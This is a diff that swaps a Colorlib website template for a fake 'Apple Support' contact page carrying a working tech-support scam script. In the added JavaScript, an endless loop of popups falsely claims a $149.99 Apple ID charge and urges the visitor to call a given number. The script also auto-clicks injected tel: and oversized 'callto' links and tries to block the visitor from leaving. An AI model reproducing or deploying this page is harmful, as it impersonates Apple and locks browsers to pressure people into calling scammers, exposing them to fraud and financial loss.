@@ -1,13 +1,8 @@
-<?php
-?>
-<!doctype html>
-<html lang="en">
-
-  <head>
-    <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<head>
+     <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5041035,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5040912,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -15,422 +10,365 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041035&101" alt="free html hit counter" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5040912&101" alt="counter hit make" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <title>Ideal &mdash; Website Template by Colorlib</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    <link href="https://fonts.googleapis.com/css?family=DM+Sans:300,400,700&display=swap" rel="stylesheet">
+</head>
 
-    <link rel="stylesheet" href="fonts/icomoon/style.css">
-
-    <link rel="stylesheet" href="css/bootstrap.min.css">
-    <link rel="stylesheet" href="css/animate.min.css">
-    <link rel="stylesheet" href="css/jquery.fancybox.min.css">
-    <link rel="stylesheet" href="css/owl.carousel.min.css">
-    <link rel="stylesheet" href="css/owl.theme.default.min.css">
-    <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">
-    <link rel="stylesheet" href="css/aos.css">
-
-    <!-- MAIN CSS -->
-    <link rel="stylesheet" href="css/style.css">
-
-  </head>
-
-  <body data-spy="scroll" data-target=".site-navbar-target" data-offset="300">
-
-    
-    <div class="site-wrap" id="home-section">
-
-      <div class="site-mobile-menu site-navbar-target">
-        <div class="site-mobile-menu-header">
-          <div class="site-mobile-menu-close mt-3">
-            <span class="icon-close2 js-menu-toggle"></span>
-          </div>
-        </div>
-        <div class="site-mobile-menu-body"></div>
-      </div>
-
-
-
-      <header class="site-navbar site-navbar-target" role="banner">
-
-        <div class="container">
-          <div class="row align-items-center position-relative">
-
-            <div class="col-lg-4">
-              <nav class="site-navigation text-right ml-auto " role="navigation">
-                <ul class="site-menu main-menu js-clone-nav ml-auto d-none d-lg-block">
-                  <li class="active"><a href="index.html" class="nav-link">Home</a></li>
-                  <li><a href="project.html" class="nav-link">Project</a></li>
-                  <li><a href="services.html" class="nav-link">Services</a></li>
-                </ul>
-              </nav>
-            </div>
-            <div class="col-lg-4 text-center">
-              <div class="site-logo">
-                <a href="index.html">Ideal</a>
-              </div>
-
-
-              <div class="ml-auto toggle-button d-inline-block d-lg-none"><a href="#" class="site-menu-toggle py-5 js-menu-toggle text-white"><span class="icon-menu h3 text-white"></span></a></div>
-            </div>
-            <div class="col-lg-4">
-              <nav class="site-navigation text-left mr-auto " role="navigation">
-                <ul class="site-menu main-menu js-clone-nav ml-auto d-none d-lg-block">
-                  <li><a href="about.html" class="nav-link">About</a></li>
-                  <li><a href="blog.html" class="nav-link">Blog</a></li>
-                  <li><a href="contact.html" class="nav-link">Contact</a></li>
-                </ul>
-              </nav>
-            </div>
-            
-
-          </div>
-        </div>
-
-      </header>
-
-    
-    
-    
-    <div class="owl-carousel owl-1">
-      <div class="ftco-blocks-cover-1">
-        <div class="ftco-cover-1" style="background-image: url('images/hero_1.jpg');">
-            <div class="container">
-              <div class="row align-items-center justify-content-center">
-                <div class="col-lg-6 text-center">
-                  <h1>Welcome to <span class="text-primary">Ideal.</span>  </h1>
-                  <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
-                  <p class="mb-0"><a href="#" class="btn btn-primary px-4 py-2 rounded-0">Get A Quote</a></p>
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
                 </div>
-              </div>
-            </div>
-        </div>
-      </div>
-      <div class="ftco-blocks-cover-1">
-        <div class="ftco-cover-1" style="background-image: url('images/hero_2.jpg');">
-          <div class="container">
-              <div class="row align-items-center justify-content-center">
-                <div class="col-lg-6 text-center">
-                  <h1>Enhance Human Experience</h1>
-                  <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
-                  <p class="mb-0"><a href="#" class="btn btn-primary px-4 py-2 rounded-0">Get A Quote</a></p>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
                 </div>
-              </div>
-            </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
-      <div class="ftco-blocks-cover-1">
-        <div class="ftco-cover-1" style="background-image: url('images/hero_3.jpg');">
-          <div class="container">
-            <div class="row align-items-center justify-content-center">
-              <div class="col-lg-6 text-center">
-                <h1>The Best Interior Design</h1>
-                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
-                <p class="mb-0"><a href="#" class="btn btn-primary px-4 py-2 rounded-0">Get A Quote</a></p>
-              </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-515-4487 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-
-
-    <div class="site-section">
-      <div class="container">
-        <div class="row">
-          <div class="col-md-5">
-            <h2 class="heading-39291">We Create Building, and Interior Design That Enhance The Human Experience</h2>
-            <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ea, consequuntur, harum? Culpa, iure vel fugiat veritatis obcaecati architecto.</p>
-            <p><a href="#" class="more-39291">More About Us</a></p>
-          </div>
-
-          <div class="col-md-4 ml-auto">
-            <div class="year-experience-99301">
-              <h2 class="heading-39291">The Best In Interior Design</h2>
-              <span class="text">Years <span>of Experience</span></span>
-              <span class="number"><span>75</span></span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="site-section">
-      <div class="container">
-        <div class="row  mb-5">
-          <div class="col-md-7">
-            <h2 class="heading-39291">Our Featured <br> Services</h2>
-            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Iusto quos veniam magni totam, architecto earum dolor id obcaecati!</p>
-            <p class="my-5"><a href="#" class="more-39291">Learn More</a></p>
-          </div>
-        </div>
-
-        <div class="row">
-          <div class="col-md-6" data-aos="fade-up" data-aos-delay="">
-
-            <div class="media-92812">
-              <img src="images/img_1.jpg" alt="Image" class="img-fluid">
-              <div class="text">
-                <span class="caption">Architecture</span>
-                <h3><a href="#">SED UT PERSPICIATIS UNDE THIS</a></h3>
-                <p class="my-5"><a href="#" class="more-39291">Learn More</a></p>
-              </div>
-            </div>
-
-          </div>
-
-          <div class="col-md-6 ml-auto" data-aos="fade-up"  data-aos-delay="100">
-
-            <div class="media-92812">
-              <img src="images/img_2.jpg" alt="Image" class="img-fluid">
-              <div class="text">
-                <span class="caption">Gym &amp; Arena</span>
-                <h3><a href="#">CURABITUR BIBENDUM</a></h3>
-                <p class="my-5"><a href="#" class="more-39291">Learn More</a></p>
-              </div>
-            </div>
-
-          </div>
-
-          <div class="col-md-6" data-aos="fade-up" data-aos-delay="">
-
-            <div class="media-92812">
-              <img src="images/img_3.jpg" alt="Image" class="img-fluid">
-              <div class="text">
-                <span class="caption">Interior Design</span>
-                <h3><a href="#">Obcaecati Architecto</a></h3>
-                <p class="my-5"><a href="#" class="more-39291">Learn More</a></p>
-              </div>
-            </div>
-
-          </div>
-
-          <div class="col-md-6 ml-auto" data-aos="fade-up" data-aos-delay="100">
-
-            <div class="media-92812">
-              <img src="images/img_4.jpg" alt="Image" class="img-fluid">
-              <div class="text">
-                <span class="caption">Product Design</span>
-                <h3><a href="#">QUISQUE NON AUGUE</a></h3>
-                <p class="my-5"><a href="#" class="more-39291">Learn More</a></p>
-              </div>
-            </div>
-
-          </div>
-
-        </div>
-      </div>
-    </div>
-
-    <div class="site-section">
-      <div class="container">
-        <div class="row mb-5 align-items-center">
-          <div class="col-md-7">
-            <h2 class="heading-39291">Latest <br>Projects</h2>
-          </div>
-          <div class="col-md-5 text-right">
-            <p><a href="#" class="more-39291">View All Projects</a></p>
-          </div>
-        </div>
-      </div>
-      <div class="media-29191">
-        <div class="owl-2 owl-carousel">
-          <img src="images/hero_1.jpg" alt="Image" class="img-fluid">
-          <img src="images/hero_2.jpg" alt="Image" class="img-fluid">
-          <img src="images/hero_3.jpg" alt="Image" class="img-fluid">
-        </div>
-        <div class="container">
-          <div class="row justify-content-center">
-            <div class="col-md-7">
-              <div class="text">
-                <span class="caption mb-3 d-block">Interior Design</span>
-                <h3 class="mb-3"><a href="#">Obcaecati Architecto</a></h3>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Non libero blanditiis dignissimos natus, necessitatibus consequatur vel alias delectus!</p>
-                <p class="my-5"><a href="#" class="more-39291">View This Project</a></p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  
-    <div class="site-section section-4">
-      <div class="container">
-
-        <div class="row justify-content-center text-center">
-          <div class="col-md-7">
-            <div class="slide-one-item owl-carousel">
-              <blockquote class="testimonial-1">
-                <span class="quote quote-icon-wrap"><span class="icon-format_quote"></span></span>
-                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ducimus totam sit delectus earum facere ex ea sunt, eos?</p>
-                <cite><span class="text-black">Mike Dorney</span> &mdash; <span class="text-muted">CEO and Co-Founder</span></cite>
-              </blockquote>
-
-              <blockquote class="testimonial-1">
-                <span class="quote quote-icon-wrap"><span class="icon-format_quote"></span></span>
-                <p>Eligendi earum ad perferendis dolores, dolor quas. Ullam in, eaque mollitia suscipit id aspernatur rerum! Sit quibusdam ullam tempora quis, in voluptatum maiores veritatis recusandae!</p>
-                <cite><span class="text-black">James Smith</span> &mdash; <span class="text-muted">CEO and Co-Founder</span></cite>
-              </blockquote>
-
-              <blockquote class="testimonial-1">
-                <span class="quote quote-icon-wrap"><span class="icon-format_quote"></span></span>
-                <p> Officia, eius omnis rem non quis eos excepturi cumque sequi pariatur eaque quasi nihil dicta tempore voluptate culpa, veritatis incidunt voluptatibus qui?</p>
-                <cite><span class="text-black">Mike Dorney</span> &mdash; <span class="text-muted">CEO and Co-Founder</span></cite>
-              </blockquote>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    
-
-    <div class="site-section">
-      <div class="container">
-        <div class="row  mb-5">
-          <div class="col-md-7">
-            <h2 class="heading-39291">Blog and Updates</h2>
-            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Iusto quos veniam magni totam, architecto earum dolor id obcaecati!</p>
-            
-          </div>
-        </div>
-        <div class="row align-items-stretch">
-          <div class="col-lg-3 col-md-6 mb-5">
-            <div class="post-entry-1 h-100">
-              <a href="#">
-                <img src="images/post_1.jpg" alt="Image"
-                 class="img-fluid">
-              </a>
-              <div class="post-entry-1-contents">
-                <span class="meta">July 17, 2019</span>
-                <h2><a href="#">Iusto quos veniam magni totam</a></h2>
-                <p class="my-3"><a href="#" class="more-39291">Continue Reading</a></p>
-              </div>
-            </div>
-          </div>
-          <div class="col-lg-3 col-md-6 mb-5">
-            <div class="post-entry-1 h-100">
-              <a href="#">
-                <img src="images/post_2.jpg" alt="Image"
-                 class="img-fluid">
-              </a>
-              <div class="post-entry-1-contents">
-                <span class="meta">July 17, 2019</span>
-                <h2><a href="#">Iusto quos veniam magni totam</a></h2>
-                <p class="my-3"><a href="#" class="more-39291">Continue Reading</a></p>
-              </div>
-            </div>
-          </div>
-          <div class="col-lg-3 col-md-6 mb-5">
-            <div class="post-entry-1 h-100">
-              <a href="#">
-                <img src="images/post_3.jpg" alt="Image"
-                 class="img-fluid">
-              </a>
-              <div class="post-entry-1-contents">
-                <span class="meta">July 17, 2019</span>
-                <h2><a href="#">Iusto quos veniam magni totam</a></h2>
-                <p class="my-3"><a href="#" class="more-39291">Continue Reading</a></p>
-              </div>
-            </div>
-          </div>
-          <div class="col-lg-3 col-md-6 mb-5">
-            <div class="post-entry-1 h-100">
-              <a href="#">
-                <img src="images/post_4.jpg" alt="Image"
-                 class="img-fluid">
-              </a>
-              <div class="post-entry-1-contents">
-                <span class="meta">July 17, 2019</span>
-                <h2><a href="#">Iusto quos veniam magni totam</a></h2>
-                <p class="my-3"><a href="#" class="more-39291">Continue Reading</a></p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    
-
-    
-    <footer class="site-footer">
-      <div class="container">
-        <div class="row">
-          <div class="col-md-6">
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
-              <div class="col-md-7">
-                <h2 class="footer-heading mb-4">About Us</h2>
-                <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts. </p>
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-              </div>
-              <div class="col-md-4 ml-auto">
-                <h2 class="footer-heading mb-4">Features</h2>
-                <ul class="list-unstyled">
-                  <li><a href="#">About Us</a></li>
-                  <li><a href="#">Testimonials</a></li>
-                  <li><a href="#">Terms of Service</a></li>
-                  <li><a href="#">Privacy</a></li>
-                  <li><a href="#">Contact Us</a></li>
-                </ul>
-              </div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-            </div>
-          </div>
-          <div class="col-md-4 ml-auto">
-
-            <div class="mb-5">
-              <h2 class="footer-heading mb-4">Subscribe to Newsletter</h2>
-              <form action="#" method="post" class="footer-suscribe-form">
-                <div class="input-group mb-3">
-                  <input type="text" class="form-control border-secondary text-white bg-transparent" placeholder="Enter Email" aria-label="Enter Email" aria-describedby="button-addon2">
-                  <div class="input-group-append">
-                    <button class="btn btn-primary text-white" type="button" id="button-addon2">Subscribe</button>
-                  </div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
             </div>
+        </section>
+    </div>
 
-
-            <h2 class="footer-heading mb-4">Follow Us</h2>
-            <a href="#about-section" class="smoothscroll pl-0 pr-3"><span class="icon-facebook"></span></a>
-            <a href="#" class="pl-3 pr-3"><span class="icon-twitter"></span></a>
-            <a href="#" class="pl-3 pr-3"><span class="icon-instagram"></span></a>
-            <a href="#" class="pl-3 pr-3"><span class="icon-linkedin"></span></a>
-            </form>
-          </div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-888-515-4487
+			 " property="telephone">
+            </section>
         </div>
-        <div class="row pt-5 mt-5 text-center">
-          <div class="col-md-12">
-            <div class="border-top pt-5">
-              <p>
-            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-            Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="icon-heart text-danger" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank" >Colorlib</a>
-            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-            </p>
-            </div>
-          </div>
-
-        </div>
-      </div>
     </footer>
 
-    </div>
 
-    <script src="js/jquery-3.3.1.min.js"></script>
-    <script src="js/popper.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/owl.carousel.min.js"></script>
-    <script src="js/jquery.sticky.js"></script>
-    <script src="js/jquery.waypoints.min.js"></script>
-    <script src="js/jquery.animateNumber.min.js"></script>
-    <script src="js/jquery.fancybox.min.js"></script>
-    <script src="js/jquery.easing.1.3.js"></script>
-    <script src="js/aos.js"></script>
 
-    <script src="js/main.js"></script>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-  </body>
 
-</html>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-515-4487');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-515-4487"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-515-4487 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
